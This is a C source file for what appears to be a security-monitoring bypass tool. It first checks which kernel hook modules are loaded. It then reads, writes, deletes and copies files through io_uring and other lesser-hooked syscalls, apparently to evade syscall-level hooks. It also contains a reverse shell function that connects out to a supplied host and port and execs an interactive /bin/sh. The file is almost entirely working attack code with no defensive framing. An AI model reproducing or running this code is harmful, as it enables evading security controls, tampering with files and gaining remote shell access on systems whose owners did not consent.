#define _GNU_SOURCE
#ifndef MOD_LPHOOK
#define MOD_LPHOOK    "lp_hook"
#endif
#ifndef MOD_BPFHOOK
#define MOD_BPFHOOK   "bpf_hook"
#endif
#ifndef MOD_NFHOOK
#define MOD_NFHOOK    "nf_hook"
#endif
#ifndef MOD_NFHOOK_FE
#define MOD_NFHOOK_FE "nf_hook_fe"
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/io_uring.h>
#include <linux/openat2.h>
#include <linux/fs.h>
#ifndef IORING_OP_SOCKET
#define IORING_OP_SOCKET 45
#endif
static inline int uring_setup(unsigned n, struct io_uring_params *p)
{
    return (int)syscall(__NR_io_uring_setup, n, p);
}

static inline int uring_enter(int fd, unsigned s, unsigned m, unsigned fl)
{
    return (int)syscall(__NR_io_uring_enter, fd, s, m, fl, NULL, 0);
}
struct uring {
    int fd;
    uint32_t *sq_tail, *sq_mask, *sq_array;
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;
    void *sq_ring; size_t sq_ring_sz;
    size_t sqe_sz; uint32_t sq_entries;
};
static int uring_init(struct uring *r, unsigned n)
{
    struct io_uring_params p = {};
    r->fd = uring_setup(n, &p);
    if (r->fd < 0) return -errno;
    if (!(p.features & IORING_FEAT_SINGLE_MMAP)) { close(r->fd); return -ENOSYS; }
    size_t sqs = p.sq_off.array + p.sq_entries * 4;
    size_t cqs = p.cq_off.cqes  + p.cq_entries * sizeof(*r->cqes);
    r->sq_ring_sz = sqs > cqs ? sqs : cqs;
    r->sq_ring = mmap(NULL, r->sq_ring_sz, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
    if (r->sq_ring == MAP_FAILED) { close(r->fd); return -errno; }
    char *b = r->sq_ring;
    r->sq_tail  = (uint32_t*)(b + p.sq_off.tail);
    r->sq_mask  = (uint32_t*)(b + p.sq_off.ring_mask);
    r->sq_array = (uint32_t*)(b + p.sq_off.array);
    r->cq_head  = (uint32_t*)(b + p.cq_off.head);
    r->cq_tail  = (uint32_t*)(b + p.cq_off.tail);
    r->cq_mask  = (uint32_t*)(b + p.cq_off.ring_mask);
    r->cqes     = (struct io_uring_cqe*)(b + p.cq_off.cqes);
    r->sq_entries = p.sq_entries;
    r->sqe_sz = p.sq_entries * sizeof(*r->sqes);
    r->sqes = mmap(NULL, r->sqe_sz, PROT_READ|PROT_WRITE,
                   MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) { munmap(r->sq_ring, r->sq_ring_sz); close(r->fd); return -errno; }
    return 0;
}

static struct io_uring_sqe *uring_sqe(struct uring *r)
{
    uint32_t t = *r->sq_tail;
    struct io_uring_sqe *s = &r->sqes[t & *r->sq_mask];
    memset(s, 0, sizeof(*s));
    r->sq_array[t & *r->sq_mask] = t & *r->sq_mask;
    __atomic_store_n(r->sq_tail, t + 1, __ATOMIC_RELEASE);
    return s;
}

static int32_t uring_submit_and_wait(struct uring *r)
{
    uint32_t t = *r->sq_tail;
    uint32_t h = __atomic_load_n(r->sq_tail - 1 , __ATOMIC_ACQUIRE);
    (void)h;
    uring_enter(r->fd, 1, 1, IORING_ENTER_GETEVENTS);
    uint32_t ch = __atomic_load_n(r->cq_head, __ATOMIC_ACQUIRE);
    uint32_t ct = *r->cq_tail;
    if (ch == ct) return -ETIMEDOUT;
    int32_t res = r->cqes[ch & *r->cq_mask].res;
    __atomic_store_n(r->cq_head, ch + 1, __ATOMIC_RELEASE);
    (void)t;
    return res;
}

static void uring_fini(struct uring *r)
{
    munmap(r->sqes, r->sqe_sz);
    munmap(r->sq_ring, r->sq_ring_sz);
    close(r->fd);
}

static int module_loaded(const char *name)
{
    FILE *f = fopen("/proc/modules", "r"); if (!f) return 0;
    char line[256], mod[64]; int found = 0;
    while (fgets(line, sizeof(line), f))
        if (sscanf(line, "%63s", mod) == 1 && strcmp(mod, name) == 0) { found = 1; break; }
    fclose(f);
    return found;
}

static void recon(void)
{
    const char *mods[] = { MOD_LPHOOK, MOD_BPFHOOK, MOD_NFHOOK, MOD_NFHOOK_FE, NULL };
    printf("hook stack modules:\n");
    for (int i = 0; mods[i]; i++)
        printf("  %-20s %s\n", mods[i], module_loaded(mods[i]) ? "LOADED" : "absent");
}

static int bypass_read(const char *path)
{
    struct uring r;
    if (uring_init(&r, 8) < 0) { perror("io_uring_setup"); return 1; }
    char buf[4096] = {};
    struct io_uring_sqe *s = uring_sqe(&r);
    s->opcode = IORING_OP_OPENAT;
    s->fd     = AT_FDCWD;
    s->addr   = (uint64_t)(uintptr_t)path;
    s->open_flags = O_RDONLY;
    s->len    = 0644;
    s->user_data = 1;
    int32_t res = uring_submit_and_wait(&r);
    if (res < 0) { fprintf(stderr, "uring openat: %s\n", strerror(-res)); uring_fini(&r); return 1; }
    int file_fd = res;
    s = uring_sqe(&r);
    s->opcode = IORING_OP_READ;
    s->fd     = file_fd;
    s->addr   = (uint64_t)(uintptr_t)buf;
    s->len    = sizeof(buf) - 1;
    s->off    = 0;
    s->user_data = 2;
    res = uring_submit_and_wait(&r);
    if (res < 0) { fprintf(stderr, "uring read: %s\n", strerror(-res)); }
    else { buf[res] = '\0'; printf("%s", buf); }
    s = uring_sqe(&r);
    s->opcode = IORING_OP_CLOSE;
    s->fd     = file_fd;
    uring_submit_and_wait(&r);
    uring_fini(&r);
    return (res < 0) ? 1 : 0;
}

static int bypass_write(const char *path, const char *content)
{
    struct uring r;
    if (uring_init(&r, 8) < 0) { perror("io_uring_setup"); return 1; }
    struct io_uring_sqe *s = uring_sqe(&r);
    s->opcode     = IORING_OP_OPENAT;
    s->fd         = AT_FDCWD;
    s->addr       = (uint64_t)(uintptr_t)path;
    s->open_flags = O_WRONLY | O_CREAT | O_TRUNC;
    s->len        = 0644;
    s->user_data  = 1;
    int32_t res = uring_submit_and_wait(&r);
    if (res < 0) { fprintf(stderr, "uring openat: %s\n", strerror(-res)); uring_fini(&r); return 1; }
    int file_fd = res;
    s = uring_sqe(&r);
    s->opcode    = IORING_OP_WRITE;
    s->fd        = file_fd;
    s->addr      = (uint64_t)(uintptr_t)content;
    s->len       = (uint32_t)strlen(content);
    s->off       = 0;
    s->user_data = 2;
    res = uring_submit_and_wait(&r);
    if (res < 0) fprintf(stderr, "uring write: %s\n", strerror(-res));
    else printf("[bypass] wrote %d bytes to %s\n",
                res, path);
    s = uring_sqe(&r);
    s->opcode = IORING_OP_CLOSE;
    s->fd     = file_fd;
    uring_submit_and_wait(&r);
    uring_fini(&r);
    return (res < 0) ? 1 : 0;
}

#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE (1 << 1)
#endif
#ifndef __NR_renameat2
#define __NR_renameat2 316
#endif
static int bypass_delete(const char *path)
{
    char dirpath[4096];
    strncpy(dirpath, path, sizeof(dirpath) - 1);
    dirpath[sizeof(dirpath) - 1] = '\0';
    char *slash = strrchr(dirpath, '/');
    if (slash) *slash = '\0'; else strcpy(dirpath, ".");
    int tmpfd = open(dirpath, O_WRONLY | O_TMPFILE, 0600);
    if (tmpfd < 0) {
        fprintf(stderr, "[bypass] O_TMPFILE not available, truncating instead\n");
        return bypass_write(path, "");
    }
    char tmp_name[4096];
    snprintf(tmp_name, sizeof(tmp_name), "%s/.livepatch_bypass_tmp_%d", dirpath, (int)getpid());
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", tmpfd);
    if (linkat(AT_FDCWD, fd_path, AT_FDCWD, tmp_name, AT_EMPTY_PATH) < 0) {
        fprintf(stderr, "[bypass] linkat: %s (need CAP_DAC_READ_SEARCH or fs.protected_hardlinks=0)\n",
                strerror(errno));
        close(tmpfd);
        return 1;
    }
    int r = (int)syscall(__NR_renameat2, AT_FDCWD, path, AT_FDCWD, tmp_name, RENAME_EXCHANGE);
    if (r < 0) {
        fprintf(stderr, "[bypass] renameat2 EXCHANGE: %s\n", strerror(errno));
        unlink(tmp_name);
        close(tmpfd);
        return 1;
    }
    unlink(tmp_name);
    close(tmpfd);
    printf("[bypass] %s removed\n",
           path);
    return 0;
}

static int bypass_copy(const char *src, const char *dst)
{
    int sfd = open(src, O_RDONLY);
    if (sfd < 0) { perror("open src"); return 1; }
    struct stat st;
    fstat(sfd, &st);
    int dfd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (dfd < 0) { perror("open dst"); close(sfd); return 1; }
    ssize_t copied = syscall(__NR_copy_file_range, sfd, NULL, dfd, NULL, (size_t)st.st_size, 0);
    close(sfd); close(dfd);
    if (copied < 0) { perror("copy_file_range"); return 1; }
    printf("[bypass] copied %zd bytes %s → %s\n",
           copied, src, dst);
    return 0;
}

static int bypass_shell(const char *host, int port)
{
    struct uring r;
    if (uring_init(&r, 16) < 0) { perror("io_uring_setup"); return 1; }
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        fprintf(stderr, "invalid address: %s\n", host); uring_fini(&r); return 1;
    }
    struct io_uring_sqe *s = uring_sqe(&r);
    s->opcode     = IORING_OP_SOCKET;
    s->fd         = AF_INET;
    s->off        = SOCK_STREAM;
    s->len        = 0;
    s->rw_flags   = 0;
    s->user_data  = 1;
    int32_t res = uring_submit_and_wait(&r);
    if (res < 0) { fprintf(stderr, "uring socket: %s\n", strerror(-res)); uring_fini(&r); return 1; }
    int sock = res;
    s = uring_sqe(&r);
    s->opcode   = IORING_OP_CONNECT;
    s->fd       = sock;
    s->addr     = (uint64_t)(uintptr_t)&addr;
    s->off      = sizeof(addr);
    s->user_data = 2;
    res = uring_submit_and_wait(&r);
    if (res < 0) {
        fprintf(stderr, "uring connect %s:%d: %s\n", host, port, strerror(-res));
        uring_fini(&r); close(sock); return 1;
    }
    printf("[bypass] connected to %s:%d\n", host, port);
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2); close(sock);
    execl("/bin/sh", "sh", "-i", NULL);
    perror("execl");
    uring_fini(&r);
    return 1;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <recon|read|write|delete|copy|shell>\n", argv[0]);
        return 1;
    }
    if      (strcmp(argv[1], "recon")  == 0) { recon(); }
    else if (strcmp(argv[1], "read")   == 0) {
        if (argc < 3) { fprintf(stderr, "need <file>\n"); return 1; }
        return bypass_read(argv[2]);
    }
    else if (strcmp(argv[1], "write")  == 0) {
        if (argc < 4) { fprintf(stderr, "need <file> <content>\n"); return 1; }
        return bypass_write(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "delete") == 0) {
        if (argc < 3) { fprintf(stderr, "need <file>\n"); return 1; }
        return bypass_delete(argv[2]);
    }
    else if (strcmp(argv[1], "copy")   == 0) {
        if (argc < 4) { fprintf(stderr, "need <src> <dst>\n"); return 1; }
        return bypass_copy(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "shell")  == 0) {
        if (argc < 4) { fprintf(stderr, "need <host> <port>\n"); return 1; }
        return bypass_shell(argv[2], atoi(argv[3]));
    }
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
